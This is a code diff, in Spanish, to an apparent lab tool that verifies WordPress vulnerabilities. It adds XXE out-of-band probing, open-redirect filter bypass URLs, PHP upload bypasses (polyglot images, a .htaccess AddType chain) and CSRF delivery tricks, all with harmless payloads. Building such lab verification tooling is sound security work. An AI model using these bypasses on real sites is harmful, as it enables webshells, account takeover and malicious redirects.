+                                   params=payload if m == "GET" else None, timeout=20)
+                    except Exception:
+                        pass
+                else:
+                    try:
+                        boot.sub_sess.request(m, boot.base_url + endpoint, data=oob_xml.encode(),
+                                   headers={"Content-Type": "application/xml"}, timeout=20)
+                    except Exception:
+                        pass
+                time.sleep(2)
+                oob_log = lab.listener_log()
+                oob_hit = oob_token in oob_log
+                res.evidence["oob_intento"] = {"token": oob_token, "hit": oob_hit}
+                if oob_hit:
+                    found = True
+                    res.evidence["tecnica"] = "oob-blind"
+                    res.evidence["modo_ganador"] = "OOB via listener interno"
+
         if found:
             res.verified = True
             res.ok = True
-            res.detail = (f"XXE confirmada ({res.evidence['modo_ganador']}): la respuesta "
-                          f"contiene el secreto exacto plantado en {canary_path} -- el parser XML "
-                          f"resolvio una entidad externa apuntando al sistema de ficheros real")
+            if res.evidence.get("tecnica") == "oob-blind":
+                res.detail = ("XXE ciego/OOB confirmado: el parser XML intento resolver una "
+                              "entidad externa apuntando a un listener interno (inalcanzable "
+                              "desde fuera del laboratorio), y la conexion llego con el token "
+                              "exacto -- prueba de que el parser resuelve entidades externas "
+                              "arbitrarias, aunque no se extrajo el contenido del fichero (mas "
+                              "debil que la prueba en banda con el canario)")
+            else:
+                res.detail = (f"XXE confirmada ({res.evidence['modo_ganador']}): la respuesta "
+                              f"contiene el secreto exacto plantado en {canary_path} -- el "
+                              f"parser XML resolvio una entidad externa apuntando al sistema de "
+                              f"ficheros real")
         else:
             res.ok = True
-            res.detail = (f"se probaron {len(tried)} formas de mandar la entidad externa y "
-                          f"ninguna devolvio el secreto plantado -- el XXE no se confirmo (puede "
-                          f"que el parser tenga resolve_external_entities desactivado, o el "
-                          f"endpoint/parametro no son los reales)")
+            res.detail = (f"se probaron {len(tried)} formas de mandar la entidad externa (en "
+                          f"banda) y el intento OOB via listener interno, y ninguna confirmo "
+                          f"nada -- el XXE no se confirmo (puede que el parser tenga "
+                          f"resolve_external_entities desactivado, o el endpoint/parametro no "
+                          f"son los reales)")
         res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
@@ -1760,43 +2104,70 @@ def verify_wordpress_open_redirect(
             return res
 
         token = _token()
-        target = f"https://binoracle-lab-redirect-{token}.invalid/pwned"
+        evil_host = f"binoracle-lab-redirect-{token}.invalid"
+        # variantes de bypass: cada una ataca un tipo de filtro distinto -- una comprobacion con
+        # startswith('http') se salta con protocol-relative, una que solo mira el host tras el
+        # esquema se confunde con el truco de userinfo (@), un parser laxo acepta backslash donde
+        # el navegador tambien lo acepta, y un filtro de substring ingenuo cae con espacios/tabs.
+        targets = [
+            f"https://{evil_host}/pwned",                              # URL externa directa
+            f"//{evil_host}/pwned",                                    # protocol-relative
+            f"https:/\\{evil_host}/pwned",                             # backslash parcial
+            f"https:\\\\{evil_host}\\pwned",                           # backslash total
+            f"https://trusted.example.com@{evil_host}/pwned",          # userinfo (host confiable antes de @)
+            f"https://{evil_host}\\@trusted.example.com/pwned",        # userinfo invertido con backslash
+            f" https://{evil_host}/pwned",                             # espacio inicial
+            f"\thttps://{evil_host}/pwned",                            # tab inicial
+            f"https://{evil_host}#@trusted.example.com/",              # truco de fragmento
+            f"https://trusted.example.com.{evil_host}/pwned",          # subdominio del host confiable
+        ]
         m = (http_method or "GET").upper()
-        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
-        payload[redirect_param] = target
+        tried = []
+        confirmed_entry = None
+        for target in targets:
+            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            payload[redirect_param] = target
+            step(f"probando {m} {endpoint} con {redirect_param}={target!r} (sin seguir redirects)...")
+            try:
+                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                                   data=payload if m != "GET" else None,
+                                   params=payload if m == "GET" else None, timeout=20,
+                                   allow_redirects=False)
+            except Exception as e:
+                tried.append({"target": target, "error": str(e)})
+                continue
+            location = resp.headers.get("Location", "")
+            is_redirect = resp.status_code in (301, 302, 303, 307, 308)
+            confirmed = is_redirect and evil_host in location
+            tried.append({"target": target, "status": resp.status_code, "location": location,
+                         "confirmado": confirmed})
+            if confirmed:
+                confirmed_entry = tried[-1]
+                break
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
-            "redirect_param": redirect_param, "url_externa_enviada": target,
-            "metodo": m, "endpoint": endpoint,
+            "redirect_param": redirect_param, "dominio_externo_esperado": evil_host,
+            "metodo": m, "endpoint": endpoint, "intentos": tried,
         })
 
-        step(f"probando {m} {endpoint} con {redirect_param}={target!r} (sin seguir redirects)...")
-        try:
-            resp = boot.sub_sess.request(m, boot.base_url + endpoint,
-                               data=payload if m != "GET" else None,
-                               params=payload if m == "GET" else None, timeout=20,
-                               allow_redirects=False)
-        except Exception as e:
-            res.detail = f"la peticion fallo: {e}"
-            return res
-
-        location = resp.headers.get("Location", "")
-        res.evidence["status_code_respuesta"] = resp.status_code
-        res.evidence["location_recibida"] = location
-        confirmed = resp.status_code in (301, 302, 303, 307, 308) and location.startswith(target)
-        if confirmed:
+        if confirmed_entry:
             res.verified = True
             res.ok = True
+            res.evidence["status_code_respuesta"] = confirmed_entry["status"]
+            res.evidence["location_recibida"] = confirmed_entry["location"]
+            res.evidence["url_externa_ganadora"] = confirmed_entry["target"]
             res.detail = (f"OPEN REDIRECT confirmado: la peticion con {redirect_param}="
-                          f"{target!r} produjo un {resp.status_code} con Location="
-                          f"{location!r} -- el servidor redirige literalmente a un dominio "
-                          f"externo controlado por el atacante")
-            step(f"VERIFICADO: Location={location!r} coincide con la URL externa enviada.")
+                          f"{confirmed_entry['target']!r} produjo un {confirmed_entry['status']} "
+                          f"con Location={confirmed_entry['location']!r} -- el servidor redirige "
+                          f"de verdad a un dominio externo controlado por el atacante")
+            step(f"VERIFICADO: Location={confirmed_entry['location']!r} contiene el dominio "
+                 f"externo enviado.")
         else:
             res.ok = True
-            res.detail = (f"se envio {redirect_param}={target!r} pero la respuesta ({resp.status_code}"
-                          f", Location={location!r}) no redirige a la URL externa exacta -- el "
-                          f"open redirect no se confirmo")
+            res.detail = (f"se probaron {len(tried)} variantes de bypass (directa, "
+                          f"protocol-relative, backslash, userinfo, espacios/tabs, subdominio) "
+                          f"para {redirect_param} y ninguna produjo un redirect con "
+                          f"'{evil_host}' en Location -- el open redirect no se confirmo")
         res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
@@ -1848,8 +2219,26 @@ def verify_wordpress_file_upload(
             return res
 
         m = (http_method or "POST").upper()
-        name_templates = ["binoracle_{t}.php", "binoracle_{t}.php.jpg", "binoracle_{t}.phtml",
-                          "binoracle_{t}.php5", "binoracle_{t}.pHp", "binoracle_{t}.jpg.php"]
+        # cada variante ataca un tipo distinto de validacion: extension simple/doble, mayusculas
+        # mezcladas (filtros case-sensitive), truco del punto-y-coma de IIS/Apache antiguos, y
+        # magic bytes REALES de imagen delante del PHP (bypass de getimagesize()/exif_imagetype(),
+        # que solo miran los primeros bytes, no el resto del fichero).
+        variants = [
+            ("binoracle_{t}.php", b"", "image/jpeg"),
+            ("binoracle_{t}.php.jpg", b"", "image/jpeg"),
+            ("binoracle_{t}.phtml", b"", "image/jpeg"),
+            ("binoracle_{t}.php5", b"", "image/jpeg"),
+            ("binoracle_{t}.php7", b"", "image/jpeg"),
+            ("binoracle_{t}.php3", b"", "image/jpeg"),
+            ("binoracle_{t}.pht", b"", "image/jpeg"),
+            ("binoracle_{t}.phar", b"", "application/octet-stream"),
+            ("binoracle_{t}.pHp", b"", "image/jpeg"),
+            ("binoracle_{t}.jpg.php", b"", "image/jpeg"),
+            ("binoracle_{t}.php;.jpg", b"", "image/jpeg"),
+            ("binoracle_{t}.jpg", b"GIF89a;", "image/gif"),              # polyglot GIF89a + PHP
+            ("binoracle_{t}.jpg", b"\xff\xd8\xff\xe0", "image/jpeg"),    # polyglot JPEG SOI + PHP
+            ("binoracle_{t}.png", b"\x89PNG\r\n\x1a\n", "image/png"),    # polyglot PNG + PHP
+        ]
         other_params = {k: v for k, v in (dict(parameters) if isinstance(parameters, dict)
                                           else {p: "" for p in (parameters or [])}).items()
                         if k != file_param}
@@ -1860,17 +2249,18 @@ def verify_wordpress_file_upload(
 
         found = False
         tried = []
-        for tmpl in name_templates:
+        for tmpl, magic, content_type in variants:
             token = _token()
             fname = tmpl.format(t=token)
             a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
             expected = a + b
-            php_payload = f"<?php echo {a}+{b}; ?>".encode()
-            step(f"subiendo '{fname}' con {file_param} (contenido PHP que calcula {a}+{b})...")
+            php_payload = magic + f"<?php echo {a}+{b}; ?>".encode()
+            step(f"subiendo '{fname}' con {file_param} (magic bytes={magic!r}, contenido PHP "
+                 f"que calcula {a}+{b})...")
             try:
                 resp = boot.sub_sess.request(
                     m, boot.base_url + endpoint, data=other_params,
-                    files={file_param: (fname, php_payload, "image/jpeg")}, timeout=20)
+                    files={file_param: (fname, php_payload, content_type)}, timeout=20)
             except Exception as e:
                 tried.append({"filename": fname, "error_subida": str(e)})
                 continue
@@ -1916,20 +2306,82 @@ def verify_wordpress_file_upload(
                        f"raw unexecuted source).")
                 break
         res.evidence["intentos"] = tried
+
+        # ultimo recurso: la cadena clasica del .htaccess de Apache. Si ninguna extension/magic
+        # byte colo, se intenta subir un .htaccess que reinterprete .jpg como PHP (AddType), y
+        # LUEGO una imagen con el payload -- dos peticiones encadenadas en vez de una sola, pero
+        # con la misma prueba dura (la suma calculada) al final.
+        htaccess_evidence = None
+        if not found:
+            step("ninguna variante directa funciono; probando la cadena .htaccess (AddType) + "
+                 "imagen con el payload...")
+            htaccess_body = b"AddType application/x-httpd-php .jpg\n"
+            try:
+                r_ht = boot.sub_sess.request(
+                    m, boot.base_url + endpoint, data=other_params,
+                    files={file_param: (".htaccess", htaccess_body, "text/plain")}, timeout=20)
+                htaccess_evidence = {"status_subida_htaccess": r_ht.status_code}
+            except Exception as e:
+                htaccess_evidence = {"error_subida_htaccess": str(e)}
+            if htaccess_evidence.get("status_subida_htaccess") is not None:
+                token = _token()
+                fname = f"binoracle_{token}.jpg"
+                a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
+                expected = a + b
+                php_payload = f"<?php echo {a}+{b}; ?>".encode()
+                step(f"subiendo '{fname}' tras el .htaccess (deberia ejecutarse como PHP si el "
+                     f".htaccess se respeto)...")
+                try:
+                    resp = boot.sub_sess.request(
+                        m, boot.base_url + endpoint, data=other_params,
+                        files={file_param: (fname, php_payload, "image/jpeg")}, timeout=20)
+                    found_path = lab.find_in_webroot(token)
+                    if found_path:
+                        rel = found_path.replace("/var/www/html", "", 1)
+                        candidate_url = boot.base_url + rel
+                        import requests as _requests
+                        r2 = _requests.get(candidate_url, timeout=15)
+                        pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
+                        executed = bool(pattern.search(r2.text or ""))
+                        htaccess_evidence.update({"filename": fname, "url_publica": candidate_url,
+                                                  "suma_esperada": expected, "suma_presente": executed})
+                        if executed:
+                            found = True
+                            res.evidence["tecnica"] = "htaccess-chain"
+                            res.evidence["filename_ganador"] = fname
+                            res.evidence["url_publica_ganadora"] = candidate_url
+                            res.evidence["status_code_respuesta"] = r2.status_code
+                            res.evidence["respuesta_cuerpo_recorte"] = (r2.text or "")[:500]
+                            step(f"VERIFICADO (cadena .htaccess): {candidate_url} devolvio "
+                                 f"{expected} (={a}+{b}) -- el .htaccess subido reinterpreto "
+                                 f".jpg como PHP de verdad.")
+                except Exception as e:
+                    htaccess_evidence["error_segunda_subida"] = str(e)
+            res.evidence["htaccess_intento"] = htaccess_evidence
+
         if found:
             res.verified = True
             res.ok = True
-            res.detail = (f"FILE UPLOAD confirmado: '{res.evidence['filename_ganador']}' se subio "
-                          f"via {file_param} y, al pedirlo en {res.evidence['url_publica_ganadora']}"
-                          f", el servidor lo EJECUTO como PHP (devolvio una suma calculada por el "
-                          f"interprete, no el codigo fuente) -- prueba inequivoca de webshell, no "
-                          f"solo de que la subida fue aceptada")
+            if res.evidence.get("tecnica") == "htaccess-chain":
+                res.detail = (f"FILE UPLOAD confirmado (cadena .htaccess): se subio un .htaccess "
+                              f"que reinterpreta .jpg como PHP, y luego '"
+                              f"{res.evidence['filename_ganador']}' se EJECUTO como tal -- el "
+                              f"endpoint acepta subir .htaccess arbitrario, cadena clasica de "
+                              f"escalada a RCE")
+            else:
+                res.detail = (f"FILE UPLOAD confirmado: '{res.evidence['filename_ganador']}' se "
+                              f"subio via {file_param} y, al pedirlo en "
+                              f"{res.evidence['url_publica_ganadora']}, el servidor lo EJECUTO "
+                              f"como PHP (devolvio una suma calculada por el interprete, no el "
+                              f"codigo fuente) -- prueba inequivoca de webshell, no solo de que "
+                              f"la subida fue aceptada")
         else:
             res.ok = True
-            res.detail = (f"se probaron {len(tried)} variantes de nombre/extension y ninguna "
-                          f"produjo un fichero que se ejecutara como PHP -- el file-upload no se "
-                          f"confirmo (puede que valide de verdad la extension/el tipo MIME, o el "
-                          f"campo/endpoint no sean los reales)")
+            res.detail = (f"se probaron {len(tried)} variantes de nombre/extension/magic-bytes y "
+                          f"la cadena .htaccess, y ninguna produjo un fichero que se ejecutara "
+                          f"como PHP -- el file-upload no se confirmo (puede que valide de "
+                          f"verdad la extension/el tipo MIME/el contenido, o el campo/endpoint no "
+                          f"sean los reales)")
         res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
@@ -2001,55 +2453,83 @@ def verify_wordpress_csrf(
         if id_p:
             payload[id_p] = boot.admin_id
 
-        headers = {"Origin": "https://binoracle-csrf-lab.invalid",
-                  "Referer": "https://binoracle-csrf-lab.invalid/evil-page.html"}
+        headers_base = {"Origin": "https://binoracle-csrf-lab.invalid",
+                        "Referer": "https://binoracle-csrf-lab.invalid/evil-page.html"}
         res.evidence.update({
             "admin_user": boot.admin_user, "admin_password_original": boot.admin_pass,
-            "payload_forjado": payload, "origin_ficticio": headers["Origin"],
+            "payload_forjado": payload, "origin_ficticio": headers_base["Origin"],
             "metodo": m, "endpoint": endpoint,
         })
-        step("enviando la peticion forjada -- sesion del admin, SIN nonce, con Origin/Referer de "
-             "un dominio externo ficticio...")
-        try:
-            resp = boot.admin_sess.request(m, boot.base_url + endpoint,
-                               data=payload if m != "GET" else None,
-                               params=payload if m == "GET" else None,
-                               headers=headers, timeout=20)
-            res.evidence["status_code_respuesta"] = resp.status_code
-        except Exception as e:
-            res.detail = f"la peticion forjada fallo: {e}"
-            return res
 
+        def check_effect():
+            """Relee el estado real (segundo login o DB) tras CADA intento de entrega -- nunca se
+            confirma por un 200/302 solo."""
+            if new_pass:
+                sess = _wp_login(boot.base_url, boot.admin_user, new_pass)
+                return sess is not None
+            if new_email:
+                r = lab.wp_cli("user", "get", boot.admin_user, "--field=user_email", timeout=30)
+                return (r.stdout or "").strip() == new_email
+            return False
+
+        # variantes de ENTREGA: la peticion normal del metodo declarado (form-encoded, como la
+        # haria un <form> real), JSON (si el endpoint es una API REST que espera un body JSON), y
+        # el truco clasico de JSON-via-text/plain -- un <form> SI puede mandar Content-Type:
+        # text/plain con un body de texto arbitrario (sin preflight CORS), asi que si el
+        # endpoint hace json_decode($raw_body) sin mirar el Content-Type, este bypass funciona
+        # igual que un <form> normal, sin necesitar JavaScript ni fetch().
+        import json as _json_mod
+        delivery_attempts = [
+            ("form-encoded (formulario real)", lambda: boot.admin_sess.request(
+                m, boot.base_url + endpoint, data=payload if m != "GET" else None,
+                params=payload if m == "GET" else None, headers=headers_base, timeout=20)),
+            ("JSON (application/json)", lambda: boot.admin_sess.request(
+                m, boot.base_url + endpoint, json=payload,
+                headers={**headers_base, "Content-Type": "application/json"}, timeout=20)),
+            ("JSON via text/plain (bypass de preflight, enviable desde un <form>)", lambda: boot.admin_sess.request(
+                m, boot.base_url + endpoint, data=_json_mod.dumps(payload),
+                headers={**headers_base, "Content-Type": "text/plain"}, timeout=20)),
+        ]
         confirmed = False
+        delivery_tried = []
+        for label, send_fn in delivery_attempts:
+            step(f"enviando la peticion forjada -- {label}, sesion del admin, SIN nonce, "
+                 f"Origin/Referer externo ficticio...")
+            try:
+                resp = send_fn()
+                status = resp.status_code
+            except Exception as e:
+                delivery_tried.append({"modo": label, "error": str(e)})
+                continue
+            ok_effect = check_effect()
+            delivery_tried.append({"modo": label, "status": status, "efecto_confirmado": ok_effect})
+            if ok_effect:
+                confirmed = True
+                res.evidence["modo_entrega_ganador"] = label
+                res.evidence["status_code_respuesta"] = status
+                break
+        res.evidence["intentos_entrega"] = delivery_tried
         if new_pass:
-            step("confirmando: intentando iniciar sesion de nuevo como el admin con la password "
-                 "NUEVA (forjada)...")
-            confirm_sess = _wp_login(boot.base_url, boot.admin_user, new_pass)
-            confirmed = confirm_sess is not None
             res.evidence["segundo_login_password_nueva"] = confirmed
         elif new_email:
-            step("confirmando: releyendo el registro del usuario para comprobar el email "
-                 "cambiado...")
-            r = lab.wp_cli("user", "get", boot.admin_user, "--field=user_email", timeout=30)
-            actual_email = (r.stdout or "").strip()
-            confirmed = actual_email == new_email
-            res.evidence["email_tras_peticion"] = actual_email
             res.evidence["email_esperado"] = new_email
 
         if confirmed:
             res.verified = True
             res.ok = True
-            res.detail = ("CSRF confirmado: una peticion SIN nonce, con Origin/Referer de un "
-                          "dominio externo ficticio, usando la sesion YA autenticada del admin, "
-                          "cambio de verdad su propia cuenta -- el endpoint no comprueba nonce ni "
-                          "origen")
-            step("VERIFICADO: CSRF confirmado -- la peticion forjada sin nonce cambio la cuenta "
-                 "del admin.")
+            res.detail = (f"CSRF confirmado ({res.evidence['modo_entrega_ganador']}): una "
+                          f"peticion SIN nonce, con Origin/Referer de un dominio externo "
+                          f"ficticio, usando la sesion YA autenticada del admin, cambio de "
+                          f"verdad su propia cuenta -- el endpoint no comprueba nonce ni origen")
+            step(f"VERIFICADO: CSRF confirmado ({res.evidence['modo_entrega_ganador']}) -- la "
+                 f"peticion forjada sin nonce cambio la cuenta del admin.")
         else:
             res.ok = True
-            res.detail = ("se envio la peticion forjada pero el efecto no se confirmo -- el CSRF "
-                          "no se confirmo (puede que el endpoint SI compruebe nonce/origen, o que "
-                          "el payload/endpoint no sean los reales)")
+            res.detail = (f"se probaron {len(delivery_tried)} formas de entrega (form-encoded, "
+                          f"JSON, JSON via text/plain) de la peticion forjada y en ninguna se "
+                          f"confirmo el efecto -- el CSRF no se confirmo (puede que el endpoint "
+                          f"SI compruebe nonce/origen, o que el payload/endpoint no sean los "
+                          f"reales)")
         res.evidence["screenshots"] = boot.shots
         return res
     except subprocess.TimeoutExpired as e:
